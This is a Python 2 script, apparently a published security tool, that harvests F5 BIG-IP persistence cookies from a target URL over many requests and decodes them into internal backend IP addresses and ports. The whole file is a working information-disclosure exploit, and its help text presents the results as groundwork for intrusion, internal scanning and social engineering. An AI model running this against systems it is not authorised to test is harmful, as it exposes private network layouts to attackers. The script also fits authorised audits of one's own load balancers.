#!/usr/bin/python
import requests
import sys
import socket
import struct
import re
import getopt

def usage():
	print "======================================"
	print "	   bigIP_backendScan      "
	print " author : Mickael Dorigny         "
	print " @MickaelDorigny - http://synetis.com "
	print " http://information-security.fr    "
	print "======================================"
	print "\nHelp :\n"
	print "This python script exploit the information leakage due to bigip default (mis)configuration. You will find more information about this default configuration here : https://www.owasp.org/index.php/SCG_D_BIGIP#Persistence_Cookie_Information_Leakage"
	print "Collecting LAN/DMZ internal informations like IP range and server adresses/ports can be used for future intrusion, internal scan and social engineering scenario"
	print "Note : support multiple BigIP cookie for one target URL."
	print "\n[*] Usage : python " + sys.argv[0] + " -u https://mytarget.tld\n"
	print " -u : specify your target URL with http:// https:// and :port if needed"
	print " -n : Cookie name, you can target a specific cookie name if the default 'BigIPxxxx' cookie name is changed"
	print " -r : request number, change the default request number to make (default = 50)."
	print "\n===================================\nExample :\n"
	print "./bigIP_backendScan.py -u https://mytarget.tld"
	print "./bigIP_backendScan.py -u http://mytarget.tld:8080 -r 100"
	print "./bigIP_backendScan.py -u https://mytarget.tld:443 -n customBigIPCookieName"
	return

def revertIP(revertIP_ip):
	''' Decode decimal IP to octal'''
	ipTab = revertIP_ip.split('.')
	newIP = str(ipTab[3])+"."+str(ipTab[2])+"."+str(ipTab[1])+"."+str(ipTab[0])
	return newIP

def revertPort(revertPort_port):
	''' Decode decimal Port to octal'''
	portTab = revertPort_port.split(".")
	newPort = str(portTab[2])
	return newPort


myopts, args = getopt.getopt(sys.argv[1:], "n:r:u:h")
# Set default values
requestNumber = 50
cookieName="(BIGIP.*)"
urlTarget="default"

# Option processing part
if len(sys.argv) < 2:
	usage()
        exit(0)
for o, a in myopts:
	if o == "-r":
		requestNumber = a
	if o == "-h":
		usage()
		exit(0)		
	if o == "-n":
		cookieName = a
	if o == "-u":
		urlTarget = a

print "[?] Trying to recover internal IP addresses from BIGIP cookies for  with following parameters:\n - target URL : ["+urlTarget+"] \n - request number : ["+str(requestNumber)+"]\n - cookie name ["+cookieName+"]."

allCookies = []
ipList = []
i = 0
print "[+] Collecting data..."
# Make XX requests to collecte different value for the BigIP Cookie
# Making multiple request boost our chances to get the entire pool
while (i < int(requestNumber)):
	session = requests.Session()
	response = session.get(urlTarget)
	# Parse each collected cookie for the request
	for coo in session.cookies:
		# If cookie name match with our search, then append the cookie list
	        getBigIP = re.search(cookieName, str(coo), re.IGNORECASE)
	        if getBigIP:
			allCookies.append(str(getBigIP.group(1)))
	i = i + 1
# Progress bar, because it's fun
        if (i == int(requestNumber)/5):
               print "\t[+] 20%..."
        if (i == (int(requestNumber)/5)*2):
               print "\t[+] 40%..."
       	if (i == (int(requestNumber)/5)*3):
               print "\t[+] 60%..."
       	if (i == (int(requestNumber)/5)*4):
               print "\t[+] 80%..."
	session = {}

coo = ""

# Sort + Uniq on Cookie list
sortedAllCookies = sorted(set(allCookies))
cookieName = "default"

print "[+] Processing data..."
print "[+] Results :"
# Sort, uniq, translation and display
for coo in sortedAllCookies:
	cooTab = coo.split("=")
	if cookieName == "default":
		cookieName = cooTab[0]
		print "[+] Cookie : " + cookieName
	if cooTab[0] != cookieName:
		cookieName = cooTab[0]
		print "[+] Cookie : " + cookieName
	tmpTab = cooTab[1].split(" ")
	T = tmpTab[0]
	cookieContentTab = T.split(".")
        decimalIP= cookieContentTab[0]
        decimalPort = cookieContentTab[1]
	# Decode collected data
	IP = socket.inet_ntoa(struct.pack('!L', int(decimalIP)))
	port = socket.inet_ntoa(struct.pack('!L', int(decimalPort)))
	newIP = revertIP(str(IP))
	newPort= revertPort(str(port))
	print "\t[+] "+newIP +":"+ newPort
